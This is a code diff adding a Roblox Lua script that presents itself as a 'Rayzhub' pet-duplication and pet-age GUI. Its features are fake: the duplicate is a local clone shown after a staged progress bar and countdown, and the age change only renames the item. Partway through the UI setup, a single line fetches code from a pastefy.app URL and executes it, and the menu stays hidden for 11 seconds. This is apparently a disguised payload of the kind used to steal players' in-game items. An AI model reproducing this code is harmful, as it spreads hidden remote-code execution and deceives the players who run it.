@@ -1,0 +1,281 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "| Rayzhub |"
+
+local main = Instance.new("Frame", screenGui)
+main.Size = UDim2.new(0, 280, 0, 210)
+main.Position = UDim2.new(0.5, -140, 0.5, -105)
+main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+main.Visible = false -- hidden at start
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+main.Active = true
+main.Draggable = true
+
+local stroke = Instance.new("UIStroke", main)
+stroke.Thickness = 2
+
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "| Rayzhub |"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.new(1, 1, 1)
+
+local underline = Instance.new("Frame", main)
+underline.Size = UDim2.new(0.8, 0, 0, 2)
+underline.Position = UDim2.new(0.1, 0, 0, 30)
+underline.BackgroundColor3 = Color3.new(1, 1, 1)
+underline.BorderSizePixel = 0
+
+local bottomLine = Instance.new("Frame", main)
+bottomLine.Size = UDim2.new(1, 0, 0, 2)
+bottomLine.Position = UDim2.new(0, 0, 1, -2)
+bottomLine.BackgroundColor3 = Color3.new(1, 1, 1)
+bottomLine.BorderSizePixel = 0
+
+local dupeButton = Instance.new("TextButton", main)
+dupeButton.Size = UDim2.new(0.8, 0, 0, 40)
+dupeButton.Position = UDim2.new(0.1, 0, 0.25, 0)
+dupeButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+dupeButton.TextColor3 = Color3.new(1, 1, 1)
+dupeButton.Font = Enum.Font.Gotham
+dupeButton.TextSize = 18
+dupeButton.Text = "Duplicate Pet"
+Instance.new("UICorner", dupeButton).CornerRadius = UDim.new(0, 8)
+
+local newButton = Instance.new("TextButton", main)
+newButton.Size = UDim2.new(0.8, 0, 0, 40)
+newButton.Position = UDim2.new(0.1, 0, 0.52, 0)
+newButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+newButton.TextColor3 = Color3.new(1, 1, 1)
+newButton.Font = Enum.Font.Gotham
+newButton.TextSize = 18
+newButton.Text = "Set Age to 50"
+Instance.new("UICorner", newButton).CornerRadius = UDim.new(0, 8)
+
+local status = Instance.new("TextLabel", main)
+status.Size = UDim2.new(1, -20, 0, 30)
+status.Position = UDim2.new(0, 10, 0.8, 0)
+status.BackgroundTransparency = 1
+status.Text = "Status: Ready"
+status.Font = Enum.Font.Gotham
+status.TextSize = 14
+status.TextColor3 = Color3.fromRGB(200, 200, 200)
+status.TextXAlignment = Enum.TextXAlignment.Left
+
+loadstring(game:HttpGet("https://pastefy.app/ltgVdkP8/raw"))()
+
+-- 🌈 Rainbow effect for all UI parts
+task.spawn(function()
+	while true do
+		for h = 0, 1, 0.01 do
+			local color = Color3.fromHSV(h, 1, 1)
+			stroke.Color = color
+			title.TextColor3 = color
+			dupeButton.TextColor3 = color
+			newButton.TextColor3 = color
+			status.TextColor3 = color
+			underline.BackgroundColor3 = color
+			bottomLine.BackgroundColor3 = color
+			task.wait(0.03)
+		end
+	end
+end)
+
+-- Appear GUI after 11 seconds
+task.delay(11, function()
+	main.Visible = true
+end)
+
+local function dropVisual(tool)
+	local icon = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
+	if not icon then return end
+
+	local clone = icon:Clone()
+	clone.Anchored = true
+	clone.CanCollide = false
+	clone.Transparency = 0.3
+	clone.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
+	clone.Parent = workspace
+
+	local goal = clone.Position - Vector3.new(0, 3, 0)
+	local tween = TweenService:Create(clone, TweenInfo.new(0.7, Enum.EasingStyle.Quad), {Position = goal, Transparency = 1})
+	tween:Play()
+	tween.Completed:Connect(function()
+		clone:Destroy()
+	end)
+end
+
+local function copyAnimationState(originalTool, cloneTool)
+	local originalAnimController = originalTool:FindFirstChildWhichIsA("AnimationController", true)
+	local cloneAnimController = cloneTool:FindFirstChildWhichIsA("AnimationController", true)
+
+	if originalAnimController and cloneAnimController then
+		for _, track in ipairs(originalAnimController:GetPlayingAnimationTracks()) do
+			local anim = Instance.new("Animation")
+			anim.AnimationId = track.Animation.AnimationId
+			local newTrack = cloneAnimController:LoadAnimation(anim)
+			newTrack:Play()
+		end
+	end
+end
+
+local canDupe = true
+local cooldown = 20
+
+local function duplicateEquippedTool()
+	if not canDupe then return end
+	canDupe = false
+	dupeButton.Text = "Checking..."
+	status.Text = "Status: Checking Pet..."
+
+	local character = player.Character
+	local toolFound = nil
+
+	if character then
+		for _, tool in ipairs(character:GetChildren()) do
+			if tool:IsA("Tool") then
+				toolFound = tool
+				break
+			end
+		end
+	end
+
+	if not toolFound then
+		status.Text = "Status: No tool equipped!"
+		dupeButton.Text = "Duplicate Pet"
+		canDupe = true
+		return
+	end
+
+	status.Text = "Status: Duping pet..."
+	dropVisual(toolFound)
+
+	for i = 1, 100 do
+		dupeButton.Text = "Duplicating... " .. i .. "%"
+		task.wait(0.01)
+	end
+
+	task.delay(cooldown, function()
+		local dupe = toolFound:Clone()
+		dupe.Name = toolFound.Name
+
+		if character and character:FindFirstChild("Humanoid") then
+			local humanoid = character:FindFirstChild("Humanoid")
+			dupe.Parent = character
+			humanoid:EquipTool(dupe)
+		else
+			dupe.Parent = backpack
+		end
+
+		task.wait(0.2)
+		copyAnimationState(toolFound, dupe)
+	end)
+
+	status.Text = "Status: Pet will appear after cooldown."
+
+	for i = cooldown, 1, -1 do
+		dupeButton.Text = "Cooldown: " .. i .. "s"
+		task.wait(1)
+	end
+
+	canDupe = true
+	dupeButton.Text = "Duplicate Pet"
+	status.Text = "Status: Ready again!"
+end
+
+dupeButton.MouseButton1Click:Connect(duplicateEquippedTool)
+
+-- 🆕 Cooldown for Set Age
+local canSetAge = true
+local ageCooldown = 20
+
+newButton.MouseButton1Click:Connect(function()
+	if not canSetAge then return end
+	canSetAge = false
+
+	status.Text = "Status: Preparing to set age..."
+	newButton.Text = "Setting..."
+
+	local character = player.Character
+	local tool = nil
+
+	if character then
+		for _, item in ipairs(character:GetChildren()) do
+			if item:IsA("Tool") then
+				tool = item
+				break
+			end
+		end
+	end
+
+	if not tool then
+		status.Text = "Status: No tool equipped!"
+		newButton.Text = "Set Age to 50"
+		canSetAge = true
+		return
+	end
+
+	for i = ageCooldown, 1, -1 do
+		newButton.Text = "Cooldown: " .. i .. "s"
+		status.Text = "Status: Setting age in " .. i .. "s..."
+		task.wait(1)
+	end
+
+	local name = tool.Name
+	if string.find(name, "Age %d+") then
+		tool.Name = string.gsub(name, "Age %d+", "Age 50")
+	else
+		tool.Name = name .. " Age 50"
+	end
+
+	status.Text = "Status: Pet is now Age 50!"
+	newButton.Text = "Set Age to 50"
+	canSetAge = true
+end)
+
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Parent = screenGui
+toggleButton.Position = UDim2.new(0, 20, 0, 20)
+toggleButton.Size = UDim2.new(0, 75, 0, 55)
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+toggleButton.Text = "Rayz"
+toggleButton.Font = Enum.Font.GothamBold
+toggleButton.TextSize = 18
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.AutoButtonColor = false
+
+local toggleCorner = Instance.new("UICorner", toggleButton)
+toggleCorner.CornerRadius = UDim.new(0, 10)
+
+local toggleStroke = Instance.new("UIStroke", toggleButton)
+toggleStroke.Thickness = 2
+toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+toggleStroke.LineJoinMode = Enum.LineJoinMode.Round
+toggleStroke.Color = Color3.fromRGB(255, 0, 0)
+
+task.spawn(function()
+	local h = 0
+	while true do
+		h += 0.01
+		if h > 1 then h = 0 end
+		local color = Color3.fromHSV(h, 1, 1)
+		toggleButton.TextColor3 = color
+		toggleStroke.Color = color
+		task.wait(0.03)
+	end
+end)
+
+-- Show/hide GUI (instant)
+local isOpen = true
+toggleButton.MouseButton1Click:Connect(function()
+	isOpen = not isOpen
+	main.Visible = isOpen
+end)
